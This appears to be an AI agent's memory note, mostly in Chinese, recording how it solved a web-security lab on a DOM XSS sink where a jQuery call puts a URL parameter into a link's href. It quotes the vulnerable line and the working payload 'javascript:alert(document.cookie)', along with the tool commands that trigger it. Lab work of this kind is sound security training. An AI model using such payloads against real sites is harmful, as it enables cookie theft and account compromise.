---
metadata:
  node_type: memory
name: "PRS arm A lab-jquery-href-attribute-sink"
description: "arm A 基线:lab-jquery-href-attribute-sink 冷实例一次通过 - /feedback 的 #backLink href 来自 URLSearchParams returnPath,载荷 javascript:alert(document.cookie) + page_alert --click 即 fired,banner solved"
last_updated: 2026-10-09T01:16:40+08:00
created: 2026-10-09T01:16:40+08:00
---

## 2026-10-09 — arm A baseline: lab-jquery-href-attribute-sink

A 臂基线,冷实例(reused:false)一次通过。

- 侦察:`page_read` 取 widget-lab-id(FDE8784B…)，`range_launch launch-url <canonical path>` + jar /tmp/cj1.json 直出实例(无需 page_read 取号亦可，但 launch-url 路径即 canonical，省一轮)。
- 源码判读:`http_dump /feedback --out /tmp/feedback.html` 后 `text_grep`(注意参数序是 <pattern> <path>)命中 sink 行:`$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));` —— 纯客户端 sink，无服务端反射点。
- 载荷:`/feedback?returnPath=javascript:alert(document.cookie)`，用 `page_alert <url> --click '#backLink'` 一步触发(sink 只改属性，不点不响)。
- 结果:`fired=true`(alerts:["alert:"])，`banner_verdict` solved=true + congrats。
- 要点:该类 DOM XSS 题的横幅在本浏览器触发 alert 后即判 solved，不需要 exploit server；`page_alert --click` 是 href/javascript: sink 的通用触发件。
- 版式:URLSearchParams 取值不做白名单，`javascript:` 直接落 href ⇒ 无编码绕过需求。

